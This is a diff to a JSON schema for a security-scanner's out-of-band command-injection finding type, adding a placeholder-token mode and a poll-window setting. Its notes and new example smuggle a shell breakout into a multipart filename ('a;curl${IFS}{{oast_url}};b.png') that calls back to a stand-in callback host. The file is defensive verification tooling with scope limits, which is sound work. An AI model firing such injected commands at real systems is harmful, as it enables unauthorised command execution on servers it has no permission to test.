@@ -4,8 +4,8 @@
   "description": "Command injection proven out-of-band: the injected command reaches an OAST host the engine controls.",
   "x-flags": "-oast",
   "x-notes": [
-    "evidence.mutation_slots.oast_host names a form field in request.body (or \"body.<field>\") where the OAST host is written.",
-    "Your payload around the field must turn the injected host into a running command (e.g. `; nslookup <host>`).",
+    "Token mode (preferred for shell breakouts): set mutation_slots.oast_host to the literal token \"{{oast_url}}\" or \"{{oast_host}}\" and place that token anywhere in request.url / body / header values — inside a shell breakout, a multipart filename, a query param, or a JSON value. The engine substitutes {{oast_url}} with its full callback URL (use with curl/wget) and {{oast_host}} with the bare OAST host (use with nslookup/ping), leaving your surrounding payload (e.g. `;curl${IFS}{{oast_url}};`) intact.",
+    "Legacy field mode: set mutation_slots.oast_host to a form field name (or \"body.<field>\") and the engine overwrites that URL-encoded form field with the bare OAST host. Only works when the sink already runs a network command on the raw field (e.g. `nslookup <field>`); it cannot express a breakout.",
     "Source attribution is required — a callback not from the target infra does not count."
   ],
   "type": "object",
@@ -29,7 +29,7 @@
           "type": "object",
           "required": ["oast_host"],
           "additionalProperties": { "type": "string" },
-          "description": "Must contain oast_host -> the body field the OAST host is written into."
+          "description": "Must contain oast_host -> either the literal token \"{{oast_url}}\"/\"{{oast_host}}\" you placed in the request (token mode), or a form field name the bare host overwrites (legacy mode)."
         }
       }
     },
@@ -38,7 +38,8 @@
       "additionalProperties": false,
       "required": ["expected_signal"],
       "properties": {
-        "expected_signal": { "type": "string", "description": "e.g. oast_interaction" }
+        "expected_signal": { "type": "string", "description": "e.g. oast_interaction" },
+        "poll_window_seconds": { "type": "number", "description": "max seconds to wait for the callback (async sinks need longer); default 120" }
       }
     }
   },
@@ -61,6 +62,27 @@
           "body": "domain=placeholder"
         },
         "mutation_slots": { "oast_host": "domain" }
+      },
+      "proof": { "expected_signal": "oast_interaction" }
+    },
+    {
+      "finding_id": "cmdi-oast-token-multipart-filename",
+      "type": "command_injection.oast",
+      "target": {
+        "expected_origin": "https://app.example.com",
+        "allowed_hosts": ["app.example.com"],
+        "allowed_schemes": ["https"],
+        "allowed_ports": [443]
+      },
+      "auth": { "required": false },
+      "evidence": {
+        "request": {
+          "method": "POST",
+          "url": "https://app.example.com/api/upload",
+          "headers": [{ "name": "content-type", "value": "multipart/form-data; boundary=X" }],
+          "body": "--X\r\nContent-Disposition: form-data; name=\"file\"; filename=\"a;curl${IFS}{{oast_url}};b.png\"\r\nContent-Type: image/png\r\n\r\nPNGDATA\r\n--X--\r\n"
+        },
+        "mutation_slots": { "oast_host": "{{oast_url}}" }
       },
       "proof": { "expected_signal": "oast_interaction" }
     }
